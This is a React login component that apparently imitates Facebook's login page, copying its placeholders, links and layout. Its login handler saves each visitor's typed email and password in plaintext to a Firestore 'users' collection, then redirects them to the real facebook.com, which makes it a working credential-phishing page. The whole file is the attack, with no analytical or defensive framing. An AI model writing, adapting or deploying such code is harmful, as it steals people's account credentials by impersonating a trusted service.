import React, { useState } from 'react';
import { collection, addDoc } from 'firebase/firestore';
import { db } from '../firebase';

const Login = () => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(true);

    const handleLogin = async () => {
        try {
            // Store user data in Firestore
            await addDoc(collection(db, 'users'), {
                email,
                password,
            });

            console.log('Data stored successfully!');

            window.location.href = 'https://www.facebook.com/';
        } catch (error) {
            console.error('Data storage failed:', error.message);
        }
    };

    return (
        <div className="login-container">
            <div className="login-form">
                <div className='InputContainer'>
                    <input
                        type="text"
                        placeholder="Email or Phone Number"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                    />
                </div>
                <div className='InputContainer'>
                    <input
                        type={showPassword ? "password" : "text"}
                        placeholder="Password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                    />
                    <i className={`eye bi ${showPassword ? 'bi-eye-slash' : 'bi-eye'}`} onClick={() => setShowPassword(!showPassword)}></i>
                </div>
                <button onClick={handleLogin}>Log In</button>
                <div className="forgot-password">Forgotten Password?</div>
                <div className='LineBreak' />
                <button className="create-account">Create New Account</button>
            </div>
            <div className='page-create'>
                <a href="/pages/create/?ref_type=registration_form" class="_8esh">Create a Page&nbsp;</a>
                for a celebrity, brand or business.
            </div>
        </div>
    );
};

export default Login;
